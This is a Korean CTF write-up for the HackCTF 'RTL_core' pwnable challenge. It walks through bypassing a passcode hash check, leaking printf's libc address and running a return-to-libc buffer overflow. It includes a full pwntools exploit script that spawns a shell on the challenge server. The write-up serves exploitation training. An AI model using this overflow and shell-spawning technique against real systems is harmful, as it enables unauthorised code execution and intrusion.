---
layout: post
title:  "HacCTF RTL core write-up"
date:   2020-01-12 19:45:55
image:  hackctf_rtl_core.PNG
tags:   [HackCTF]
categories: [Write-up]
---


### 1.  문제

걸려있는 보호기법은 다음과 같다

![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20RTL_core/Untitled.png)

![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20RTL_core/Untitled%201.png)

문제를 실행시키면 패스코드를 입력하라는 문구가 나오게 된다.

특정 패스코드를 입력해야 뭔가 다음 스텝으로 진행되는 것 같다. 

따라서 아이다로 까보쟈  
<br>

![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20RTL_core/Untitled%202.png)

9라인을 보면 gets로 입력한 s 값을 check_pascode 함수에 넣은 값과 hashcode와 비교하는 것이 보인다

![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20RTL_core/Untitled%203.png)

hashcode는 전역변수로 선언이 되어있는데 이 값은 0xc0d9b0a7 이다. check_passcode 함수의 리턴값과 저 값이 같아야지 core() 함수가 실행되는 것같다
<br><br>
![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20RTL_core/Untitled%204.png)

core함수는 다음과 같다. dlsym 함수를 이용하여 printf의 주소를 가져오는 코드이다. 따라서 해당 core 함수가 실행되면 printf 함수주소를 알려주게 된다. 즉 leak을 이용한 rtl 문제이다.
<br><br>
![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20RTL_core/Untitled%205.png)

그렇다면 우선 check_passcode 함수에서 hashcode와 같은 값을 계산하게 만들어야한다
<br><br><br>
### 2. 접근방법

우선 check_passcode를 통과시켜 보자

![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20RTL_core/Untitled%206.png)
<br><br>
입력한 값의 주소가 넘어가게된다

![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20RTL_core/Untitled%205.png)
<br><br>
for문을 보면 al값에 4*i 만큼 더하고 다시 4바이트 포인터로 형변환 값을 v2에 더하게 된다
<br><br>
즉, 정리하면

- **i = 0**

    v2 = 0 + a1

- **i = 1**

    v2 = 4 + a1

- **i = 2**

    v2 = 8 + a1

- **i = 3**

    v2 = 12 + a1

- **i = 4**

    v2 = 16 + a1  
    
<br>
다음의 로직이 수행이 되고, 이 의미는, al 주소에서 4바이트 씩 +16까지 더한다는 의미이다.

이 값이 아까 hasscode와 같아야 하기 때문에 hashcode 나누기 5 를 하면 된다

하지만 딱 떨어지지 않고 2가 남기 때문에, 마지막 al+16의 값은 +2를 해주면 된다

1. hashcode : 0xC0D9B0A7(3235492007)
2. hashcode / 5 =  647098401 (나머지 2)
3. 입력해야 하는 값 

    647098401 + 647098401  + 647098401  + 647098401  + (647098401 + 2)
    
<br>    

그다음 core함수를 통해 출력되는 printf 주소를 이용하여 rtl을 진행하면된다

문제에서 libc.so.6 파일을 주었기 때문에, pwntools symbols 기능을 이용하여 익스코드를 짜면된다
<br><br><br><br>
### 3. 풀이

최종 익스 코드는 다음과 같다
```python
# -*- coding: utf-8 -*- 

from pwn import *

p = remote("ctf.j0n9hyun.xyz",3015)
e = ELF("./libc.so.6")
#p = process("./rtlcore")
#gdb.attach(p)

p.recvuntil("Passcode: ")


printf = 0xf7e4a670
system = 0xf7e3bda0
bin_sh = 0xf7f5ca0b

printf_system = 0xe8d0
bin_sh_printf = 0x11239b


payload = p32(0x2691f021)*4
payload +=p32(0x2691f023)

p.sendline(payload)
tmp=p.recvuntil("바로 ")
log.info(tmp)

printf_addr = int(p.recv(10),16)
log.info(hex(printf_addr))


libc_base = printf_addr - e.symbols['printf']

system_addr = libc_base + e.symbols['system']
bin_sh_addr = libc_base + e.search("/bin/sh").next()

payload = "A"*66
payload += p32(system_addr)
payload += "B"*4
payload += p32(bin_sh_addr)

p.sendline(payload) 

p.interactive()
```

<br><br><br>
### 4. 몰랐던 개념

처음에는 yes_or_no 문제를 풀면서 공부한 libc 공유 라이브러리 개념을 이용하여 문제를 풀었다

leak 한 주소 하위 3바이트를 가지고 libc database online을 이용하여 해당 libc 버전을 확인하였고, vmmap 을 이용하여 한번더 버전을 확인했다.

그 결과 우분투 16버전에서 진행하면 되는 것을 확인하였고,

<br>

![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF%20RTL_core/Untitled%207.png)

다음의 명령어를 통해 주어진 libc.so.6 파일이 결국 libc.-2.23.so 파일에 링킹되어 있다는 것을 알았다


<br>
그래서

    printf : 0xf7e4a670
    system : 0xf7e3bda0
    /bin/sh : 0xf7f5ca0b
    
    1. printf - system = 0xe8d0
    2. /bin/sh - printf =  0x11239b
    
    3. leak 한 printf 주소 - 0xe8d0 = system
    4. leak 한 printf 주소 + 0x11239b = /bin/sh
    
    --------------------------------------------
    
    ret(system) + 더미 + /bin/sh주소

이렇게 gdb로 직접 오프셋을 확인하여 익스를 하였는데

process로 로컬로 붙어서 했을때는 쉘이 떨어졌는데 원격으로는 안됬다. 

이부분은 멘토님이나 다른 친구한테 질문해야 할 것같다